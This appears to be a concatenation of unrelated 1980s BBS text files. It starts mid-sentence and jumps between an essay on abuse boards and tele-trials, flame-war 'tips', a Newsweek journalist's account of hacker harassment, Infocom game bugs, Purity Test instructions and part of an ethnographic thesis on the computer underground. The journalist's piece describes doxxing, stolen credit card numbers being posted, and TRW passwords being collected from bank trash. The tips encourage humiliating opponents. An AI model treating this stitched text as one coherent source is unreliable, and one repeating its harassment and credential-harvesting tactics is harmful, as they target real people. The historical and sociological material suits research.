intrests, the computer.  But I still came back to the same question  Why do they abuse   Why   Life is bad enough as it is, and then there are the feds who are after all us pirates, phreakers, and hackers.  Who needs more enemies   While we can all be helping each other the  good old  traditional computer activi  ties like helping others get up to date  wares , even if they have a Networker modem and not that  excepted  Apple  cat   I remember back when I first got my modem.  I couldn't remember one abuse board. Not one.  Then suddenly one by one, slowly but surely, they started comming up with the demand of them due to the large amount of hartred from two users.  Now, the abuse board is just as common as the public board. Why   Why   Then somewhere, some one person had an grand idea.  The same thing that happen  ed over two hundered years ago.  This genious said, that order in the modem society is a must and some form of goverment must be formed.  Thus came Tele Trial, with this new concept came new constitutions, new sub boards, and an increasement of tele conferencing phreaking.  The constitutions would set the laws of the BBS. The sub boards would provide a special meeting place for matters of the tele trial and the tele conference for the often called  court room  for the trial of the def  endent.  This system worked in many places.  Punishments were often deletion from that board or even to the great extent of credit card infomation being released, and abused. But for many, deleting ones password would not keep them off the system.  They would just call back with a new handle and abuse more people till he was deleted again.  And the process goes on and on.  Believe me, I have seen it happen.  So I came to the conclusion that this method is not full proof.  I then came apon a crazy idea of mine.  Not so sure of myself I begin my think more indepth.  One hope for me remained, and I then walked to my computer, put in Apple Writer and began to type.  Now, I have completed my work.

   barney's bitch tip  2         make damn well sure that you're not falling into a trap.  what's a trap   well,a trap is something that someone in a position of power usually a sysop  sets when he she thinks you need to be 'put in your place'.  i could not tell you about this if i had not experienced it myself..so learn from my own mistake   lord chaos,sysop of utopia bbs is not to be trusted. probably no sysop who is under the age of 18 and starts their name with 'lord' is to be trusted,but that's a different story.   nothing per  sonal,pat.  more on traps later.    barney's bitch tip 3         to bitch effectively and with class, you need a certain talent.  you either have it or you don't,and that talent is the ability to write.  think of it this way if you don't think that you could write something like...well,let's see well,something like a g file,then chances are you are going to be made to look rather silly. a general rule of thumb concerning bitching is,the better the command of the english lan  guage,the better the bitching.  and i'm not talking about the infamous john  athan lewin school of saturate the  enemy with 3.8 metric tons of extreme  ly long words,but rather the instinct to know when to be direct ie 'so and so ,eat shit and die',or to be a bit more clever like 'what does so and so and the male sex organ have in common   they're both dicks!'.  not the best ex  ample,but you should be getting the point.    barney's bitch tip 4        this is tied in with tip  3  well pol  ished writing skills are a must,but almost equally as important is the ab  ility to spell. for myself,nothing assures me of victory more than seeing the misguided fool who took me on spell like a romper room dropout.  the most common screw ups and the most sick  ening  are along the lines of spelling you're,'your',and other such blatant gaffes.  3 lines into a message and you can tell immediately if you are deal  ing with an idiot.  but,in the same vein ,be careful at how quick you judge   typing errors are different than spel  ling errors...even i stopped editing my msgs. except in real extreme cases  months ago.  the key to looking good when bitching is to know your oppon  ent's weaknesses.  if spelling is one, then exploit it mercilessly.  but you'd better make damn well sure that he doesn't catch you doing the same thing.    barney's bitch tip 5         the advantages and disadvantages of multiple wars.     when bitching with victory in mind,it is vital that you retain control in the exchange i.e. make him respond to you more than you respond to him,get and stay in the position where you can con  sistently talk down to your opponent, things like that.  control is the key.  lose it,and you're in trouble.  an efficient way to keep control on your side,is,of course,thru having al  lies if the opponent is particularly tough .  my word on this is as follows  when bringing neutrals into a 1 on 1 war,you'd better make damn well sure who you're dealing with,just as you should know the ins and outs of your opponent.  bbs'ers are fickle,fickle people.                                      the reason i underline this is because i can't possibly stress this enough. in other words,a little paranoia never hurt anybody  trust practically no one. when assuming this attitude,you can save face if a verbal dagger flung from the keyboard of a once ally hap  pens to find its way to your back. unfortunately,there's nothing much even the best bitcher can do when dealt odds stacked by the bitchers most cov  ert enemy the sysop. the sysop and the sysop alone has the power to set the trap that no hi egoed verbal soldier can escape from...if he she feels like it,the target could find himself facing  mysteriously disappearing messages a strange and sudden lack of allies and,an army of new opponents,never seen or heard of before....  these tactics,are,of course,the trap that i referred to back in tip 2   using this method,the sysop and his cronies the new opponents,a few of which are undoubtedly the sysop him  self ,once you,as the bitcher have taken up the false challenge,proceed to flood the bitch board with messages ,and while yours mysteriously go bye  bye,wow! you've 'lost'!  it is this type of'loss'that is inesc  cpable.  if you're good enough,you can figure out the scam before you look too stupid,but your rep if you have one  is damaged.know your sysop like you would know your enemy!  he may be your enemy!       barney's bitch tip 6          using the above methods,you should now be able to definitively tell the class of your opponent.  but you should also know the class of the conflict you are in.  in my experience,there are 3 types of conflicts.    gee,barney,what are those 3 types    well,i'm glad you asked that they are  discussions,arguments and wars    discussions usually are free of any hate real or simulated ,and usually center around relatively minor topics.  a good example of a discussion would be something like 'does big business des  erve the millions of dollars damage we hacks and phreaks cause it every week  well,we all know the answer to that,but it's still a good example of a pot  ential discussion.    an argument is something like the clas  sic oct nov '84 greek inn bbs election discussion  is ronald reagan extremely dangerous or just incredibly stupid   as you can tell,something like that is bound to bring about some strong verb  age,but usually not directed against one specific user of the board from an  other user.    wars are the exchanges where you find out such interesting things as'your mom still owes me money for the 10 minutes of heaven i gave her last night',or, 'your dad told me to tell you that he can't find the whip,so you can't sleep with him tonight',or similar 10 year  old level sickening drivel.when you hapen onto a war like this,just do your best not to parachute down to the level that most bitchers are on,and carry on in the tradition of wit,not shit.good,fun,and funny wars have in  telligent bitchers.  be one,don't just watch!

This is the follow up to the                               article 'Night of the Hackers'.                            It caused a lot of havok for the                           author.  This originally                                   appeared in NEWSWEEK.                                                                                                                                          'Conference!' someone yelled as I put the phone to my ear.  Then came a mind piercing 'beep,' and suddenly my kitchen seemed full of hyperactive 15  year olds.  'You the guy that wrote the article in NEWSWEEK ' someone shouted from the depths of static, chatter and giggles.  'We're gonna disconnect your phone,' one shrieked.  'We're going to blow up your house,' called another.  I hung up.       Some irate readers write letters to the editor.  A few call their lawyers. Hackers, however, use the computer and telephone, and for more than simple comment.  Within days, computer 'bulletin boards' around the country were lit up with attacks on NEWSWEEK'S 'Montana Wildhack'  a name I took from a Kurt Vonnegut character , questioning everything from my manhood to my prose style. 'Until we get real good revenge ,' said one message from the Unknown Warrior, 'I would like to suggest that everyone with an auto dial modem call Montana Butthack then hang up when he answers.'  Since then the hackers of America have called my home at least 200 times.  My harshest critics communicate on Dragonfire, a Gainesville, Texas, bulletin board where I'm on tele trial, a video game lynching in which a computer user with a grievance dials the board and presses charges against an offending party.  Other hackers   including the defedant   post concurences or rebuttals.  Despite the mealtime interruptions, all of this was at most a minor nuisance  some was amusing, even fun.       Fraud  The fun stopped with a call from a man who identified himself only as Joe.  'I'm calling to warn you,' he said.  When I barked back, he said, 'Wait, I'm on your side.  Someone has broken into TRW and obtained a list of all your credit card numbers, your home address, social security number and wife's name and is posting it on bulletin boards around the country.'  He named the charge cards in my wallet.       Credit card numbers are a very hot commodity among hackers.  To get one from a computer system and post it is the equivilant of making the team.  After hearing from Joe I visited the local office of the TRW credit bureau and got a copy of my credit record.  Sure enough, it showed a Nov. 13 inquiry by the Lenox  Mass.  Savings Bank, an institution with no reason whatever to ask about me.  Cleary some hacker had used Lenox's password to the TRW computers to get to my files  the bank had since changed its password .       It wasn't long before I found out what was being done with my credit card numbers, thanks to another friendly hacker who tipped me to Pirate 80, a bulletin board in Charleston, W. Va., where I found this   'I'm sure you have heard about Richard Standza  sic  or Montana Wildhack.  He's the guy who wrote the obscene story about phreaking in NewsWeek  sic .  Well, my friend did a credit card check on TRW...try this number, it's a VISA...Please nail this guy bad...Captain Quieg  sic .'       Captain Quieg may himself be nailed.  He has violated the Credit Card Fraud Act of 1984, signed by President Reagan on Oct. 12.  The law provides a  10,000 fine and up to a 15 year prison term for 'trafficking' in illegally obtained credit card account numbers.  His 'friend' has commited a felony violation of the California computer crime law.  TRW Spokeswoman Delia Fernandz said that TRW would 'be more than happy to prosecute' both of them.       TRW has good reason for concern.  Its computers contain the credit histories of 120 million people.  Last year TRW sold 50 million credit reports to agencies seeking information on their customers.  But these highly confidential personal records are so poorly guarded that computerized teenagers can ransack the files and depart undetected.  TRW passwords    unlike many others    often print out when entered by TRW's customers.  Hackers then look for discarded printouts.  A good source   The trash of banks and automobile dealerships, which routinely do credit checks.  'Everybody hacks TRW,' says Cleveland hacker King Blotto, whose bulletin board has a security system the Pentagon would envy, 'It's the easiest.'  For her part, Fernandez insists that TRW 'does everything it can do to keep the system secure.'       In my case, however, that was not enough.  My credit limits would hardly support many big time fraud, but victimization takes many forms.  Another hacker said it was likely mechandise would be ordered in my name and shipped to me    just to harass me.  'I used to use  credit card numbers  against someone I didn't like,' the hacker said.  'I'd call Sear's and have a dozen toilets shipped to his house.'       Meanwhile, back on Dragonfire, my teletrial was going strong.  The charges, as pressed by the Unknown Warrior, include 'endangering all phreaks and hacks.'  The judge in this case is a hacker with the apt name of Axe Murderer.  Possible sentences range from 'life exile from the entire planet' to 'kill the dude.'  King Blotto has taken up my defense, using hacker power to make his first pleading  he dialed up Dragonfire, broke into its operating system and 'crashed' the bulletin board, destroying all messages damning me. The board is back up now, with a retrial in full swing.  But then, exile from the electronic underground looks better all the time.   "

A while back, we were wondering what would happen if you have two large containers, and you tried putting them inside each other.  So, we went into Zork I, put the coffin inside the raft, and then said PUT RAFT IN COFFIN. They both disappear!  Zork I, being our oldest game, contains some classic InfoBugs in its early version. Shaking any non empty open container may cause a crash.  You  bump your head on the river  if you try to enver it.  And saying GO  SOMETHING , such as GO ROPE, may send you into a totally bizarre location.      _____ Zork II _____     One of the funniest bugs ever discovered was that you could  talk  to various objects in Zork II, such as the aquarium.  A command like AQUARIUM, WEST would elicit the response,  The aquarium leaves the room.  One player led the aquarium halfway across the dungeon in search of the solution to a problem.      _____ Zork III _____     Possibly the most embarrassing bug ever released occurs at the very end of the eariest version of this game.  If you are carrying the sword in Prison Cell number four when the Dungeon Master pushes the button on the Parapet, the game crashes.  This happens because the sword's routine checks adjoining rooms to know whether to glow, and the relosated Prison Cell had two different NORTH exits. The reason none of the testers ever found this bug was because they all used the sword to clock the beam of light, and therefore never brought it as far as the Prison Cell!  A really fun bug occurs when you enter the dungeon, drop one of the seven items necessary for admission, and then knock on the dungeon door FROM THE INSIDE!  The Dungeon Master will tell you you're not ready and send you back to the Buttoo Room, but also follow you!  You can lead him all over the game, and even strand him in the Zork I area, if you're clever.  In an early version of the game, you could carry a light source across the lake inside the chest, thus avoiding using the viewing table to get the grue repellent, and consequently finishing the game with only 6 of the 7 points.  Since this bug was fixed, we've had people call up, saying  but my friend says the way to get to Key Room is to bring a light source across the lake inside the chest!       _____ Deadline _____     Well, there's the first floor bathroom door that was difficult to open.  If you said OPEN DOOR, you were asked  Which door do you mean, the door or the south closet door.  A bug that only few people have managed to duplicate is the strange case of the two Dunbars   the corpse lying upstairs in the bedroom, and the live Dunbar wandering around as though nothing strange has happened! Finally, here's another favorite.  Sit down on a piece of furniture, such as the couch or a bed.  Then say  something like  BAXTER, TELL ME ABOUT MARSHALL ROBNER.  Deadline replies  You can't see any me here.      _____ Starcross _____     Speaking of talking to inanimate objects, this bug is rampant in early versions of Starcross. A simple  though totally unintended  solution to the red rod problem is to say NEST, DROP ROD.  The game replies  Dropped.  Along the same lines, one player was trying to turn the beam of energy off in the Laboratory, and said BEAM, OUT.  The game's response    The beam leaves the room.  Try this one   go to the top of the tree and say THROW HANDS.  If you have an early version, Starcross replies  The pair of hands sails away, drifting in a long arc towards the ground.      Stretch your imagination a bit and try to find some spectacular bugs of your own.  The finest bugs begin in the human mind! Here's an example   what would happen if you said AGAIN on the first move of the game                                           "

Original 400 question version                  expanded to 500 questions.                                       _______________________________________________________________________________  Instructions for Use    This is a fairly long test consisting of five hundred questions.  It starts out  tame and gets progressively worse  or better, depending on your viewpoint .      There are many ways of going about taking this test.  You can, of course, as  your right, guaranteed by the Constitution, be anti social and sequester  yourself in your room and take this test all by yourself  however, we feel that  the funnest way to utilize this test is to hold a Purity Test Party.  All you  need is one copy of the test, and a bunch of friends.   Lots of writing  implements and paper would be useful too.   The person with the copy of the  test is the test administrator  s he readsd the questions out loud and  everybody else writes down their answers.  We have no definite rules as to  whether the participants are required to divulge their answers  that is up to  the group to decide.  However, each person's purity score should be made common  knowledge.   The person with the highest score gets to be giggled at for the  rest of his her life.   This works great at parties and lets everybody know  who's easy and who isn't, so you'll know who to go home with.  Don't leave home  without it.                                                                       Definitions   All questions in this test pertain to events that have happened to you  subsequent to your weaning and babyhood infancy.  Anything that may have  happened before that time is considered not standing and void.                    The term mutual masturbation refers to someone masturbating you AND OR you  masturbating someone else, not exclusively both at the same time.                 We would also like to define having sex in the homosexual case  homosexual sex  has occurred when both partners are of the same sex and one of the partners has  an orgasm while there is some contact between the genitals of both partners.      We would now like to bring to your attention that there is no passing nor  failing score.  Therefore, one really shouldn't worry too much about getting a  high score...  even if you do get giggled at for the rest of your life.

Scoring  Congratulations!  You are now the proud owner of a sheet of paper containing  lots of itty bitty answers to the Purity Test.  Sworn to excellence of  workmanship, we now give you directions on how to calculate your Purity score.   There are several methods  the calculator method works best.  Also there is the  a la mainframe method.   A DECsystem 2060 works great as a PC.    Scoring method   Count  yes  answers.                                                             Subtract that number from 500.                                                   Divide the result by 5.                                                          The result is your percentage purity.                            The higher the number, the more pure you are  in the same vein, the lower the  score, the more of a sleaze bag you are.

The CU is composed of                 actors in three roles,  computer hackers,   phone                 phreaks,  and  software pirates.   These roles have                 frequently been ignored or confused in media and other                 accounts of CU activity. By utilizing a data set culled                 from CU channels of communication this paper provides                 an ethnographic account of computer underground                 organization. It is concluded that despite the                 widespread social network of the computer underground,                 it is organized primarily on the level of colleagues,                 with only small groups approaching peer relationships.

Hackers  are computer aficionados who  break in  to                 corporate and government computer systems using their                 home computer and a telephone modem.  The prevalence of                 the problem has been dramatized by the media and                 enforcement agents, and evidenced by the rise of                 specialized private security firms to confront the                  hackers.   But despite this flurry of attention,                 little research has examined the social world of the                  computer hacker.  Our current knowledge in this regard                 derives from hackers who have been caught, from                 enforcement agents, and from computer security                 specialists.  The everyday world and activities of the                  computer hacker  remain largely unknown.                      This study examines the way actors in the                  computer underground   CU  organize to perform their                 acts. The computer underground, as it is called by                 those who participate in it, is composed of actors                 adhering to one of three roles   hackers,   phreakers,                  or  pirates.  To further understanding this growing                  social problem,  this project will isolate and clarify                                                                           8                 these roles, and examine how each contributes to the                 culture as a whole. By doing so the sociological                 question of how the  underground  is organized will be                 answered, rather than the technical question of how CU                 participants perform their acts.                      Best and Luckenbill  1982  describe three basic                 approaches to the study of  deviant  groups.  The first                 approach is from a social psychological level, where                 analysis focuses on the needs, motives, and individual                 characteristics of the actors involved.  Secondly,                 deviant groups can be studied at a socio structural                 level.  Here the emphasis is on the distribution and                 consequences of deviance within the society as a whole.                 The third approach, the one adopted by this work, forms                 a middle ground between the former two by addressing                 the social organization of deviant groups.   Focusing                 upon neither the individual nor societal structures                 entirely, social organization refers to the network of                 social relations between individuals involved in a                 common activity  pp. 13 14 .  Assessing the degree and                 manner in which the underground is organized provides                 the opportunity to also examine the culture, roles, and                 channels of communication used by the computer                 underground. The focus here is on the day to day                 experience of persons whose activities have been                                                                           9                 criminalized over the past several years.                      Hackers, and the  danger  that they present in our                 computer dependent society, have often received                 attention from the legal community and the media. Since                 1980, every state and the federal government has                 criminalized   theft by browsing  of computerized                 information  Hollinger and Lanza Kaduce, 1988, pp.101                  102 . In the media, hackers have been portrayed as                 maladjusted losers, forming  high tech street gangs                   Chicago Tribune, 1989  that are dangerous to society.                 My research will show that the computer underground                 consists of a more sophisticated level of social                 organization than has been generally recognized. The                 very fact that CU participants are to some extent                  networked  has implications for social control                 policies that may have been implemented based on an in                  complete understanding of the activity. This project                 not only offers sociological insight into the organ                  ization of deviant associations, but may be helpful to                 policy makers as well.                      I begin with a discussion of the definitional                 problems that inhibit the sociological analysis of the                 computer underground. The emergence of the computer                 underground is a recent phenomenon, and the lack of                 empirical research on the topic has created an area                                                                          10                 where few  standard  definitions and categories exist.                 This work will show that terms such as  hacker,                   phreaker,  and  pirate  have different meanings for                 those who have written about the computer underground                 and those who participate in it. This work bridges                 these inconsistencies by providing definitions that                 focus on the intentions and goals of the participants,                 rather than the legality or morality of their actions.                      Following the definition of CU activities is a                 discussion of the structure of the underground.                 Utilizing a typology for understanding the social                 organization of deviant associations, developed by Best                 and Luckenbill  1982 , the organization of the                 computer underground is examined in depth.                      The analysis begins by examining the structure of                 mutual association. This provides insight into how CU                 activity is organized, the ways in which information is                 obtained and disseminated, and explores the subcultural                 facets of the computer underground.  More importantly,                 it clearly illustrates that the computer underground is                 primarily a social network of individuals that perform                 their acts separately, yet support each other by                 sharing information and other resources.                      After describing mutual association within the                 underground community, evidence of mutual participation                                                                          11                 is presented. Although the CU is a social network, the                 ties developed at the social level encourage the                 formation of small  work groups.  At this level, some                 members of the CU work in cooperation to perform their                 acts. The organization and purposes of these groups are                 examined, as well as their relationship to the CU as a                 whole. However, because only limited numbers of                 individuals join these short lived associations, it is                 concluded that the CU is organized as colleagues. Those                 who do join  work groups  display the characteristics                 of peers, but most CU activity takes place at a fairly                 low level of sophistication.                                                                          12                                          Methodology                      Adopting an ethnographic approach, data have been                 gathered by participating in, monitoring, and cata                  loging channels of communication used by active members                 of the computer underground. These channels, which will                 be examined in detail later,  include electronic                 bulletin board systems  BBS , voice mail boxes,                 bridges, loops, e mail, and telephone conversations.                 These sources provide a window through which to observe                 interactions, language, and cultural meanings without                 intruding upon the situation or violating the privacy                 of the participants.  Because these communication                 centers are the  back stage  area of the computer                 underground, they provided insight into organizational                  and other  issues that CU participants face, and the                 methods they use to resolve them.                      As with any ethnographic research, steps have been                 taken to protect the identity of informants.  The                 culture of the computer underground aids the researcher                 in this task since phreakers, hackers, and pirates                 regularly adopt pseudonyms to mask their identity.                 However to further ensure confidentiality, all of the                 pseudonyms cited in this research have been changed by                 the author. Additionally, any information that is                                                                          13                 potentially incriminating has been removed or altered.                      The data set used for this study consists                 primarily of messages, or  logs,  which are the primary                 form of communication between users.  These logs were                  captured   recorded using the computer to save the                 messages  from several hundred computer bulletin                 boards1 located across the United States.  The bulk of                 the data were gathered over a seventeen month period                  12 87 to 4 89  and will reflect the characteristics of                 the computer underground during that time span.                 However, some data, provided to the researcher by                 cooperative subjects, dates as far back as 1984.                      The logged data were supplemented by referring to                 several CU  publications.   The members of the computer                 underground produce and distribute several technical                 and tutorial newsletters and  journals.   Since these                  publications  are not widely available outside of CU                 circles I have given a brief description of each below.                      Legion of Doom Hackers Technical Journal.  This                 ____________________                      1 Computer Bulletin Boards  BBS  are personal                computers that have been equipped with a telephone                modem and special software. Users can connect with a                BBS by dialing, with their own computer and modem, the                phone number to which the BBS is connected. After                 logging in  by supplying a valid user name and pass                 word, the user can leave messages to other users of the                system.  These messages are not private and anyone                calling the BBS can freely read and respond to them.                                                                           14                 publication is written and distributed by a group known                 as  The Legion of Doom Legion of Hackers   LoD H .  It                 is available in electronic format  a computer text                 file  and contains highly technical information on                 computer operating systems. As of this writing, three                 issues have been published.                      PHRACK Inc.   Phrack Inc is a newsletter that                 contains various articles, written by different                 authors, and  published  under one banner.  Phrack                 Inc's first issue was released in 1985, making it the                 oldest of the electronically distributed underground                 publications.  CU participants are invited to submit                 articles to the editors, who release a new issue when a                 sufficient number  about nine  of acceptable pieces                 have been gathered. Phrack also features a lengthy                  World News  with stories about hackers who have been                 apprehended and interviews with various members of the                 underground. As of this writing twenty seven issues of                 Phrack, have been published.                      Phreakers Hackers Underground Network  P Hun                   Like Phrack, P Hun collects articles from various                 authors and releases them as one issue.  Three issues                 have been published to date.                      Activist Times, Incorporated  ATI   Unlike the                 other electronically distributed publications, ATI does                                                                          15                 not limit itself to strictly computer telephone news.                 Articles normally include commentary on world and                 government events, and other  general interest  topics.                 ATI issues are generally small and consist of articles                 written by a core group of four to seven people.                 Unlike the publications discussed thus far, ATI is                 available in printed  hard copy  form by sending                 postage reimbursement to the editor.  ATI is currently                 on their 38th issue.                      2600 Magazine   Published in a traditional                  printed  magazine format, 2600  named for the                 frequency tone used to make free long distance phone                 calls  is arguably an  underground  publication as it                 is available on some newsstands and at some libraries.                 Begun in 1987 as a monthly magazine, it is now                 published quarterly. Subscription rates are  25.00 a                 year with a complete back issue selection available.                 The magazine specializes in publishing technical                 information on telephone switching systems, satellite                 descrambling codes, and news about the computer                 underground.                      TAP YIPL  First established in 1972 as YIPL  Youth                 International Party Line , this publication soon                 changed its name to TAP  Technical Assistance Party .                 Co founded by Abbie Hoffman, it is generally recognized                                                                          16                 as the grandfather of computer underground                 publications.  Publication of the 2 4 page newsletter                 has been very sporadic over the years, and currently                 two different versions of TAP, each published in                 different areas of the country, are in circulation.                      Utilizing a data set that consists of current                 message logs, old messages logs, and various CU                 publications yields a reasonably rich collection from                 which to draw the analysis.  Examination of the older                 logs and publications shows that while the actors have                 changed over the years, cultural norms and                 characteristics have remained consistent over time.                                                                          17                                What is the Computer Underground                       Defining the  computer underground  can be                 difficult. The sociologist soon finds that there are                 several competing definitions of computer underground                 activity.  Those who have written on the subject, the                 media, criminologists, computer programmers, social                 control agents, and CU participants themselves, have                 adopted definitions consistent with their own social                 positions and perspectives. Not surprisingly, these                 definitions rarely correspond. Therefore, before                 discussing the organization of the computer                 underground, it is necessary to discuss and compare the                 various definitions.  This will illustrate the range of                 beliefs about CU activity, and provide a springboard                 for the discussion of types of roles and activities                 found in the underground.                      We begin with a discussion of the media image of                 computer hackers. The media's concept of  hackers  is                 important because the criminalization of the activity                 has largely occurred as the result of media drama                  tization of the  problem   Hollinger and Lanza Kaduce,                 1988 . In fact, it was a collection of newspaper and                 film clips that was presented to the United States                 Congress during legislative debates as evidence of the                                                                          18                 computer hacking problem  Hollinger and Lanza Kaduce,                 1988, p.107 .  Unfortunately, the media assessment of                 the computer underground displays a naive understanding                 of CU activity.                      The media generally makes little distinction                 between different types of CU activity. Most any                 computer related crime activity can be attributed to                  hackers.   Everything from embezzlement to computer                 viruses have, at one time or another, been attributed                 to them. Additionally, hackers are often described as                 being sociopathic or malicious, creating a media image                 of the computer underground that may exaggerate their                 propensity for doing damage.                      The labeling of hackers as being  evil  is well                 illustrated by two recent media examples. The first is                 from Eddie Schwartz, a WGN Radio talk show host. Here                 Schwartz is addressing  Anna,  a self identified hacker                 that has phoned into the show                       You know what Anna, you know what disturbs                     me  You don't sound like a stupid person but                     you represent a . . . a . . . a . . . lack of                     morality that disturbs me greatly. You really                     do. I think you represent a certain way of                     thinking that is morally bankrupt. And I'm                     not trying to offend you, but I . . . I'm                     offended by you!  WGN Radio, 1988                       Just two months later, NBC TV's  Hour Magazine                  featured a segment on  computer crime.   In this                 example, Jay Bloombecker, director of the National                                                                          19                 Center for Computer Crime Data, discusses the  hacker                 problem  with the host of the show, Gary Collins.                      Collins  . . . are they  hackers  malicious                     in intent, or are they simply out to prove,                     ah, a certain machismo amongst their peers                       Bloombecker  I think so. I've talked about                      modem macho  as one explanation for what's                     being done. And a lot of the cases seem to                     involve  proving   sic  that he . . . can do                     something really spiffy with computers. But,                     some of the cases are so evil, like causing                     so many computers to break, they can't look                     at that as just trying to prove that you're                     better than other people.                      GC  So that's just some of it, some kind of                      bet  against the computer industry, or                     against the company.                      JB  No, I think it's more than just                     rottenness. And like someone who uses                     graffiti doesn't care too much whose building                     it is, they just want to be destructive.                      GC  You're talking about a sociopath in                     control of a computer!                      JB  Ah, lots of computers, because there's                     thousands, or tens of thousands  of hackers                       NBC TV, 1988 .                       The media image of computer hackers, and thus all                 members of the computer underground, is burdened with                 value laden assumptions about their psychological                 makeup, and focuses almost entirely upon the morality                 of their actions.  Additionally, since media stories                 are taken from the accounts of police blotters,                 security personnel, and hackers who have been caught,                 each of whom have different perspectives and                                                                          20                 definitions of their own, the media definition, if not                 inherently biased, is at best inconsistent.                      Criminologists, by way of contrast, have done                 little to define the computer underground from a                 sociological perspective.  Those criminological                 definitions that do exist are less judgmental than the                 media image, but no more precise. Labels of                  electronic trespassers   Parker, 1983 , and                  electronic vandals   Bequai, 1987  have both been                 applied to hackers.  Both terms, while acknowledging                 that  hacking  is deviant, shy away from labeling it as                  criminal  or sociopathic behavior.  Yet despite this                 seemingly non judgmental approach to the computer                 underground, both Parker and Bequai have testified                 before Congress, on behalf of the computer security in                  dustry, on the  danger  of computer hackers.                 Unfortunately, their  expert  testimony was largely                 based on information culled from newspaper stories, the                 objectiveness of which has been seriously questioned                  Hollinger and Lanza Kaduce 1988 p.105 .                      Computer security specialists, on the other hand,                 are often quick to identify CU participants as part of                 the criminal element. Correspondingly, some reject the                 notion that there are different roles and motivations                 among computer underground participants and thereby                                                                          21                 refuse to define just what it is that a  hacker  or                  phreaker  does.  John Maxfield, a  hacker expert,                  suggests that differentiating between  hackers  and                  phone phreaks  is a moot point, preferring instead                 that they all just be called  criminals   WGN Radio.                 Sept 28, 1988 .                      The reluctance or inability to differentiate                 between roles and activities in the computer                 underground, as exhibited in the media and computer                 security firms, creates an ambiguous definition of                  hacker  that possesses  two extremes  the modern day                 bank robber at one end, the trespassing teenager at the                 other.  Thus, most any criminal or mischievous act that                 involves computers can be attributed to  hackers, 2                 regardless of the nature of the crime.                      Further compounding the inconsistent use of                  hacker  is the evolution of meaning that the word has                 undergone.    Hacker  was first  applied to computer                 related activities when it was used by programmers in                 the late 1950's.  At that time it referred to the                 pioneering researchers, such as those at M.I.T., who                ____________________                      2 During the WGN Radio show on computer crime one                caller, who was experiencing a malfunctioning phone                that would  chirp  occasionally while hung up, believed                that  computer hackers  were responsible for the                problem.  The panel assured her that it was unrelated                to CU activity.                                                                           22                 were constantly adjusting and experimenting with the                 new technology  Levy, 1984. p.7 .  A  hacker  in this                 context refers to an unorthodox, yet talented,                 professional programmer. This use of the term still                 exits today, though it is largely limited to                 professional computing circles.                      Another definition of  hacker  refers to one who                 obtains unauthorized, if not illegal, access to                 computer systems and networks.  This definition was                 popularized by the movie War Games and, generally                 speaking, is the one used by the media.3 It is also the                 definition favored by the computer underground.                      Both the members of the computer underground and                 computer programmers claim ownership of  hacker,  and                 each defend the  proper  use of term.  The computer                 professionals maintain that using  hackers   or                  hacking   to refer to any illegal or illicit activity                 is a corruption of the  true  meaning of the word.  Bob                 Bickford, a professional programmer who has organized                 several programmer conferences, explains                 ____________________                      3 This is not always true of course.  The AP                Stylebook has yet to specify how  hacker  should be                used.  A recent  Associated Press story featured a                computer professional explaining that a  real hacker                 would never do anything illegal.  Yet just a few weeks                later Associated Press distributed stories proclaiming                that West German  hackers  had broken into US Defense                Department computer systems.                                                                           23                      At the most recent conference  called                      Hackers 4.0   we had 200 of the most                     brilliant computer professionals in the world                     together for one weekend  this crowd included                     several PhD's, several presidents of                     companies  including large companies, such as                     Pixar , and various artists, writers,                     engineers, and programmers.  These people all                     consider themselves Hackers  all derive great                     joy from their work, from finding ways around                     problems and limits, from creating rather                     than destroying.  It would be a great                     disservice to these people, and the thousands                     of professionals like them, to let some                     pathetic teenaged criminals destroy the one                     word which captures their style of                     interaction with the universe  Hackers                      Bickford, 1988 .                      Participants in the computer underground also                 object to the  misuse  of the term. Their objection                 centers around the indiscriminate use of the word to                 refer to computer related crime in general and not,                 specifically, the activities of the computer                 underground                       Whenever the slightest little thing happens                     involving computer security, or the breach                     thereof, the media goes fucking bat shit and                     points all their fingers at us 'nasty                     hackers.' They're so damned ignorant it's                     sick  EN, message log, 1988 .                      . . . whenever the media happens upon                     anything that involves malicious computer use                     it's the  HACKERS.   The word is a catch                     phrase it makes mom drop the dishes and watch                     the TV.  They use the word because not only                     they don't really know the meaning but they                     have lack of a word to describe the                     perpetrator.  That's why hacker has such a                     bad name, its always associated with evil                     things and such  PA, message log, 1988 .                      I never seen a phreaker called a phreaker                                                                          24                      when caught and he's printed in the                     newspaper. You always see them  Hacker caught                     in telephone fraud.    Hacker defrauds old                     man with phone calling card.  What someone                     should do is tell the fucken  sic  media to                     get it straight  TP2, message log, 1988 .                       Obviously the CU and computer professional                 definitions of  hacker  refer to different social                 groups.  As Best and Luckenbill  1982, p. 39  observe                   Every social group modifies the basic language to fit                 its own circumstance, creating new words or using                 ordinary words in special ways.   Which definition, if                 either, will come into widespread use remains to be                 seen.  However, since computer break ins are likely to                 receive more media attention than clever feats of                 programming, the CU definition is likely to dominate                 simply by being used more often.4  But as long as the                 two definitions do exist there will be confusion unless                 writers and researchers adequately specify the group                 under discussion.  For this reason, I suggest that                 sociologists, and criminologists in particular, adopt                 the  underground  definition for consistency and                ____________________                      4 Another factor may be the adoption  of a close                proximity to the underground definition being included                in the 1986 edition of Webster's New World dictionary                      hack.er n. 1. a person who hacks 2. an unskilled                golfer, tennis player, etc. 3. a talented amateur user                of computers, specif. one who attempts to gain                unauthorized access to files.                                                                           25                 accuracy when speaking of the actions of CU                 participants.                      While it is recognized that computer hacking is a                 relatively new phenomenon, the indiscriminant use of                 the term to refer to many different forms of unorthodox                 computer use has been counterproductive to                 understanding the extent of the activity. To avoid this                 a  computer hacker  should be defined as an individual,                 associated with the computer underground, who                 specializes in obtaining unauthorized access to                 computer systems.  A  phone phreak  in an individual,                 associated with the computer underground, who                 specializes in obtaining unauthorized information about                 the phone system.  A  software pirate  is an                 individual, associated with the computer underground,                 who distributes or collects copyrighted computer                 software. These definitions have been derived from the                 data, instead of relying upon those who defend the                  integrity  of the original meanings, or those who are                 unfamiliar with the culture.                                                                          26                             Topography of the Computer Underground                      Having defined the three main roles in the                 computer underground, it is necessary to examine each                 activity separately in order to provide a general                 typology of the computer underground.  In doing so, the                 ways in which each contributes to the culture as a                 whole will be illustrated, and the divisions between                 them that affect the overall organization will be                 developed. Analysis of these roles and divisions is                 crucial to understanding identity, access, and mobility                 within the culture.                   Hacking                      In the vernacular of the computer underground,                  hacking  refers to gaining access and exploring                 computer systems and networks.  Hacking  encompasses                 both the act and the methods used to obtain valid user                 accounts on computer systems.                         Hacking  also refers to the activity that                 occurs once access to another computer has been                 obtained. Since the system is being used without                 authorization, the hacker does not, generally speaking,                 have access to the usual operating manuals and other                 resources that are available to legitimate users.                                                          